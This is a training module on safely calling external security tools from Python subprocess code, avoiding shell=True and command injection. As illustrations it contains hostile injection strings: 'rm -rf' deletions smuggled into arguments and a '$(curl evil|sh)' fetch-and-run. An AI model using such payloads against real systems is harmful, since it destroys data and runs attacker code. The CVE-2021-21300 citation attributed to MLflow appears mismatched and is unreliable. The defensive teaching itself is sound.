# Module 05 — Driving Tools Safely

*Type 9 · Tool-Build — wrap external tools (nmap, VirusTotal, MISP) from `sift` without opening a command-injection hole, and parse their output robustly. (Secondary: Type 14 · Adversarial Review — catch the copilot's `shell=True`.) [Go to the hands-on lab →](lab.md)* &nbsp;·&nbsp; *[Cheat sheet →](cheatsheet.md)*

*Last reviewed: 2026-07*

**Python for Security** — *the copilot's favourite way to run a tool — `shell=True` — is also the fastest way to hand an attacker your shell.*

!!! abstract "In 60 seconds"
    Security tools drive other tools: `sift` needs to shell out to `nmap`, a VirusTotal CLI, `pymisp`.
    The copilot's reflex is `subprocess.run(f"nmap {target}", shell=True)` — and the moment `target` is
    attacker-influenced (and in a triage tool, it *is* — it came from an alert), `; rm -rf /` or
    `$(curl evil|sh)` runs on your box. This module builds the safe pattern into `sift`: `shell=False`
    with an argument **list**, never string interpolation; validate/allowlist what you pass; and parse
    structured tool output instead of scraping text. You'll also do an adversarial-review beat — catch a
    planted `shell=True` injection in copilot-generated code.

## Why this matters

OS command injection is one of the oldest, most reliable, most damaging bug classes there is, and Python
makes it a one-character mistake: `shell=True`. That flag tells `subprocess` to hand your string to
`/bin/sh`, which happily interprets `;`, `|`, `$()`, and backticks. In a triage tool the danger is acute
because the input *isn't yours* — the hostname, URL, or hash you're about to scan came from an alert an
attacker may have shaped. A single `subprocess.run(f"whois {domain}", shell=True)` where `domain` is
`evil.com; rm -rf ~` is remote code execution in your SOC tooling.

This bug is everywhere in the wild — Python libraries and apps have shipped real, CVE-tracked
command-injection holes from exactly this pattern. And it's *especially* an AI-review problem: copilots
generate `shell=True` constantly because it's the shortest way to make a command work in a demo. Catching
it is a core competency of "you review → you own it."

## The core idea

**`shell=False` with a list is the whole defense.** `subprocess.run(["nmap", "-sV", target])` passes
`target` as a single argument directly to `execve` — no shell, no metacharacter interpretation, so
`target = "x; rm -rf /"` is just a (malformed) hostname `nmap` rejects, not a command. `shell=False` is
the default; the fix is often *deleting* `shell=True` and turning the f-string into a list. When you
genuinely must build a command string, `shlex.quote()` escapes it — but the list form is better because
it removes the shell entirely.

**Validate before you shell out.** Defense in depth: even with `shell=False`, pass tools *validated*
input. Reuse Module 02's discipline — an indicator that's supposed to be a domain should be validated as
one (allowlist the character set, reject the weird) before it's handed to any external process. A tool
that only ever receives well-formed arguments has a smaller attack surface than one that trusts the alert.

**Parse structured output, don't scrape text.** The other half of driving a tool well: `nmap -oX`,
`vt`'s JSON, `pymisp`'s objects give you structured output — parse *that*, not the human-readable text
that changes format between versions and breaks your regex. Robust parsing is what makes the wrapper
reliable enough for the CLI and API surfaces you add in Module 06.

??? note "When you *think* you need `shell=True` — pipes, globs, redirection"
    Those are the usual excuses, and they're avoidable. A pipeline is two `subprocess` calls wired via
    `stdout`/`stdin` in Python (you keep control and error handling). Globbing is `pathlib.Path.glob`.
    Redirection is the `stdout=`/`stderr=` arguments. Reaching for `shell=True` to get shell *features* is
    almost always a sign the work belongs in Python, where it's both safer and more testable.

## Learn (~2 hrs)

**The safe subprocess pattern**

- [Python `subprocess` docs — "Security Considerations" + "Frequently Used Arguments"](https://docs.python.org/3/library/subprocess.html#security-considerations)
  (~25 min) — read the security section specifically; it spells out why `shell=True` with untrusted input is dangerous and what the list form fixes.
- [`shlex` docs — `shlex.quote`](https://docs.python.org/3/library/shlex.html#shlex.quote) (~10 min) —
  the escape hatch for the rare case you must build a shell string.

**Why it matters (the anchor)**

- [OWASP — Command Injection](https://owasp.org/www-community/attacks/Command_Injection) (~15 min) — the
  attack class, its impact, and the defenses; ground the module in the canonical reference.
- [CVE-2021-21300 — command injection in MLflow via `subprocess(..., shell=True)` (NVD)](https://nvd.nist.gov/vuln/detail/CVE-2021-21300)
  (~10 min) — a real advisory where an unsanitized git URI passed to `shell=True` was the hole; the fix
  replaced it with the list-form `subprocess` call — exactly this module's lesson.

**Driving real tools**

- [`python-nmap` or direct `nmap -oX` parsing](https://nmap.org/book/output-formats-xml-output.html)
  (~15 min) — parse structured XML output, not scraped text.

## Key concepts
- **`shell=True` + untrusted input = command injection** — the copilot's default, and a real CVE class.
- **`shell=False` with an argument list** passes args straight to `execve` — no shell to inject into.
- **`shlex.quote`** for the rare must-build-a-string case; the list form is still better.
- **Validate/allowlist args before shelling out** — reuse Module 02's boundary discipline.
- **Parse structured output** (`-oX`, JSON) — don't regex human-readable text.

## AI acceleration
This module has an explicit adversarial-review beat: you're handed copilot-generated tool wrappers with a
planted `shell=True` injection, and your job is to find it, say *how* you knew (the f-string into
`shell=True`), and fix it to the list form. Then, going forward, treat every `subprocess` call the copilot
writes as guilty until proven `shell=False` — it's the single highest-value review reflex in this track.

!!! question "Check yourself"
    - Exactly why is `subprocess.run(["whois", domain])` safe where `subprocess.run(f"whois {domain}",
      shell=True)` is not, when `domain` is attacker-controlled?
    - You "need a pipe" between two tools — how do you do it without `shell=True`?
    - What's the tell that lets you spot command injection in a code review in under five seconds?
